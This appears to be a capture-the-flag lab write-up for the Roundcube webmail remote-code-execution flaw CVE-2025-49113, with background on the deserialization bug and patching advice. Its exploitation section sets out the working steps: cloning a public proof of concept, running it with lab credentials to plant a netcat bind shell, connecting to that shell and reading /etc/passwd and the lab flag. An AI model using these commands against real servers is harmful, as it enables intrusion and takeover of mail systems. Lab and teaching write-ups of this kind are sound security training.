![Banner](https://github.com/user-attachments/assets/8296479c-e8e6-439a-b941-8780de7193be)


# Roundcube: CVE-2025-49113

## Task1 : Introduction

> **Roundcube Webmail Overview**
1. Free & open-source webmail project.
2. Supports 80+ languages & third-party plugins.
3. Runs on:
    - Web servers: Apache, Nginx, Lighttpd (PHP required).
    - Databases: MySQL, MariaDB, PostgreSQL, SQLite, etc.
      
4. Popular among hosting providers.

> **Vulnerability Details**
1. **Affected versions:** 1.5.x (`<1.5.10`) & 1.6.x (`<1.6.11`).
2. **Type:** Remote Code Execution (RCE) via insecure deserialization.
3. **CVSS 3.x Score:** `9.9` (`Critical`).
4. Exploitation Requirement: Valid webmail credentials.
5. Fix: Patched in versions `1.5.10` & `1.6.11`.



<br>


## Task 2 : Technical Background

> **Serialization:**
- Converts objects into storable/transmittable formats.

> **Deserialization Vulnerability:**
- Occurs when untrusted data is deserialized.
- Allows arbitrary code execution or privilege escalation.

> **Root Cause:**
- `_from` property in `upload.php` lacked proper validation.
- Fixed by adding input sanitization checks (e.g., `rcube_utils::is_simple_string()`).
![image](https://github.com/user-attachments/assets/6a96c989-1c04-46de-ae2b-ca7b70e99c83)


<br>


## Task 3 : Exploitation

At first  I used Ellie’s credentials to access the webmail at 	`http://MACHINE_IP/roundcube`
  
  Username: 	`ellieptic	`
  
  Password: 	`ChangeMe123`
  
        
![image](https://github.com/user-attachments/assets/3fa2c99d-4c05-482c-8350-b542570caebc)

<br>

> **Exploit Code**

  A proof of concept (`PoC`) exploit code is published by `FearsOff` on their GitHub repository. The easiest way to follow along would be to download the exploit code using 
  
    git clone https://github.com/fearsoff-org/CVE-2025-49113
    
![image](https://github.com/user-attachments/assets/06017190-ba58-42aa-891c-126a75dc6cf2)
  
  The `CVE-2025-49113.php` executes the necessary steps to get the payload of your choice executed on the target server. After retrieving a `CSRF token` and a `session cookie`, this PoC PHP script logs in using the provided `username` and `password`. The core steps of this script lie in the following:


-  Craft a malicious serialised PHP object
-  Embed the crafted object in the _from parameter
-  Send a POST request to the upload.php endpoint using the malicious _from parameter


The command look like this.. where we will specify the `url`, `username`, `password` and `command`. 

       php CVE-2025-49113.php target_url username password command.
  
  The received malicious parameter will be deserialised and executed on the server side.


<br>

  So, I setup the payload accordingly and the command we will be using, is for creating a `bind shell`. For which we will open a conncetion at server side by running the `netcat` listner at port `4444`.

    php CVE-2025-49113.php http://MACHINE_IP/roundcube ellieptic ChangeMe123 "ncat -lvnp 4444 -e /bin/bash"

  
![image](https://github.com/user-attachments/assets/c2f25027-a905-4323-9748-4f082f526d81)

  
<br>

  After succefull payload injection we will attempt to connect to the bind shell using the `netcat` by specifying the `port` and `IP`.
    
      nc MACHINE_IP 4444


![image](https://github.com/user-attachments/assets/d0f3297f-ccac-46a1-9789-9d99fa574f3c)

  As we got the sehll, our first question was to find the last name of the user `maggie` , So, for this I simply look into the `/etc/passwd` file where username along with the  password hashes are stored. 

![image](https://github.com/user-attachments/assets/d4243204-b104-4aa5-b5ed-02faa5b74cc7)
   
   So, we can see the last name of the `maggie ` is 

         Byte


<br>

  
And for the flag, I simply change the directory to `/etc/` , and I listed all the files to look for the `flag` file in them..

![image](https://github.com/user-attachments/assets/b07b9614-86f1-419a-b6e6-4f404cef5641)

After few scrolls, I found the `flag.txt`

![image](https://github.com/user-attachments/assets/02012c4e-2908-463e-8f34-4eeb62c191a0)


And I simply retireved the flag from the `flag.txt`

![image](https://github.com/user-attachments/assets/9f84610b-cc19-493b-8124-078cb87d14de)

      THM{ICE_CUBE_DESERIALISATION}


## Conclusion and Mitigation

- **Exploit Requirements:**
  1. Valid webmail credentials.
  2.  Works on default installations.
    
- **Detection Difficulty:** Blends in with normal traffic.
- **Severity:** Critical (CVSS `9.9`).

> **Mitigation Steps**

- **Update Immediately:** Upgrade to `1.5.10` (for 1.5.x) or `1.6.11` (for 1.6.x).
- **Temporary Workaround** (if update not possible): Block access to `upload.php`.

> Final Recommendation
- `Patching` is the best defense—apply updates ASAP.
- If patching is delayed, use firewall/access controls to restrict `upload.php`.



